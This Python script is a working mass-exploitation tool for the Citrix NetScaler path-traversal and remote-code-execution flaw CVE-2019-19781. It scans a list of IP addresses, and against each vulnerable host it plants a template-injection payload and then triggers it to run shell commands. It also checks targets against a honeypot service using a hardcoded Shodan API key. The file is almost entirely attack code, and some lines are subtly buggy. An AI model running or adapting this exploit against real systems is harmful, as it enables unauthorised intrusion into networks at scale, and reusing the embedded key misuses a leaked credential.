# -*- coding: utf-8 -*-
import requests
import sys
import time
import multiprocessing
import json
import uuid
from random_username.generate import generate_username
from dns import resolver,reversename

commands = ['ps -ax' ]


pool_size = multiprocessing.cpu_count()

filein = open('netscalerips.txt')

all_lines = filein.readlines()


#https://github.com/trustedsec/cve-2019-19781/blob/master/citrixmash.py -> the goat lol ya i borrowed some code he's  awesome can u blame me lol

def check_honeypot(targetip):
    shodan_honey_score_url = "https://api.shodan.io/labs/honeyscore/"
    shodan_honey_score_key =  "?key=Hgqwf9dHMIE157PNCeqVJc6TVvlyGKiP"
    response = requests.get(shodan_honey_score_url+str(targetip)+shodan_honey_score_key)
    if response.status_code == 200:
       if response.text > 5:
          print(response.text)
          print("Possible HoneyPot Detected")
          return True
       else:
          print("No HoneyPot Detected")
          return False

        
    
def rce_execute_stage1(target,targetport,command):

    print("in stage 1")

    file_name = (str(uuid.uuid4().hex))

    rand_user = generate_username(1)

    nonce = str(uuid.uuid4().hex)

    headers = (

        {

            'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0',

            'NSC_USER' :  '../../../../netscaler/portal/templates/'+file_name,

            'NSC_NONCE' : nonce,

            'Host': target


        })


    rce_data = (

        {

            "url" :target,

            "title" :"""payload="[% template.new({'BLOCK'='print `{}`'})%]""".format(command),

            "desc" : "desc",

            "UI_inuse" : "a"

        })


    try:

        print(headers)

        print(rce_data)

        # if for some ungodly reason they are using HTTP

        if targetport == ("80"):

           url = ("http://%s:%s/vpn/../vpns/portal/scripts/newbm.pl" % (target, targetport))

        else:

           url = ("https://%s:%s/vpn/../vpns/portal/scripts/newbm.pl" % (target, targetport))

        try:

            req = requests.post(url, data=rce_data, headers=headers, verify=False,timeout=5)

            # only seen when we have a successful system

            if (".ns_reload()") in str(req.content):

               print("[*] We got an expected response back for a vulnerable system. Initial stage exploit likely successful.")

               time.sleep(5)

               try:

                   rce_result = stage2(file_name, rand_user, nonce, target, targetport)

                   print(rce_result)
                   return rce_result
               except:

                   pass

                

               return ["vulnerable","200"]

            

             # 403 usually indicates it has been patched, Citrix means script wasn't found and also patched

            if ("Citrix") in str(req.content) or "403" in str(req.status_code):

                print("[\033[91m!\033[0m] The exploit failed due to the system being patched. Exiting Citrixmash.")

                return ["Not Vuln","403"]




        except Exception as ohno:

            print(ohno)

            pass            



    # handle exception errors due to timeouts

    except requests.ReadTimeout: 
        print("[-] ReadTimeout: Server %s timed out and didn't respond on port: %s." % (target, targetport))


    except requests.ConnectTimeout:
        print("[-] ConnectTimeout: Server %s did not respond to a web request or the port (%s) is not open." % (target, targetport))


    except requests.ConnectionError:
        print("[-] ConnectionError: Server %s did not respond to a web request or the port (%s) is not open." % (target,targetport))





def stage2(filename, randomuser, nonce, victimip, victimport):

    # this is where we call the file we just created, the XML on disk. Once called using the traversal attack again, it'll execute our pay load

    # in our case we decided to use Python.. based on being nested in perl, the escaping was weird which is why the payload needed to be converted

    headers = (

        {

            'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0',

            'NSC_USER' : '%s' % (randomuser),

            'NSC_NONCE' : '%s' % (nonce),

        })



    # add support for port 80

    if victimport == ("80"):

        url = ("http://%s:%s/vpn/../vpns/portal/%s.xml" % (victimip, victimport, filename))



    # using https

    else:

        url = ("https://%s:%s/vpn/../vpns/portal/%s.xml" % (victimip, victimport, filename))



    response = requests.get(url, headers=headers, verify=False,timeout=3)

    if "200" in str(response.status_code):

       print(headers)

       print(response.text)

       return response.text

    else:

       return "Not Working"

    

def check_server(targethost):

    rand_user = generate_username(1)

    nonce = uuid.uuid1()

    tmp = json.loads(targethost)

    target = tmp['ip']

    targetport = tmp['port']

    headers = (

        {

            'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0',

            'NSC_USER' : str(rand_user[0]),

            'NSC_NONCE' : str(uuid.uuid4().hex),

            'Host': target

        })


    print(headers)
    try:



        # if for some ungodly reason they are using HTTP



        if targetport == "80":

            req = requests.get("http://%s:%s/vpn/../vpns/cfg/smb.conf" % (target,targetport),headers, verify=False, timeout=2)

        else:


            # for all other handle HTTPS

            req = requests.get("https://%s:%s/vpn/../vpns/cfg/smb.conf" % (target,targetport),headers, verify=False, timeout=2)


            if "200" in str(req.status_code):

                print(req.content)

                return ["vulnerable","200",target,targetport]


            else:



                print(req.status_code)


    # handle exception errors due to timeouts

    except requests.ReadTimeout: 
        print("[-] ReadTimeout: Server %s timed out and didn't respond on port: %s." % (target, targetport))

    except requests.ConnectTimeout:
        print("[-] ConnectTimeout: Server %s did not respond to a web request or the port (%s) is not open." % (target, targetport))


    except requests.ConnectionError:
        print("[-] ConnectionError: Server %s did not respond to a web request or the port (%s) is not open." % (target,targetport))




def rev_dns_lookup(ip_address):
    addr=reversename.from_address(ip_address)
    resolved_ip = resolver.query(addr,"PTR")[0]
    if resolved_ip:
       print(str(resolved_ip))
       return resolved_ip
    else:
        return False



def main():



    pool = multiprocessing.Pool(processes=pool_size)         

    outfilenew = open("vulnerablenetscalers.txt","w")

    info = pool.map(check_server,all_lines)



    pool.close()



    pool.join()



    for items in info:

        print(items)

        if "200" in items[1]:
            outfilenew.write(items+"\n")
            print("Vuln adding to list")
            for command in commands:

                print("success Launching RCE")

                try:

                    rce_result = rce_execute_stage1(items[2],items[3],command)
                    if rce_result:
                       print(str(rce_result))
                except Exception as ohnoz:

                   print(ohnoz)
                   pass
            

    outfilenew.close()

if __name__ == "__main__":



    main()




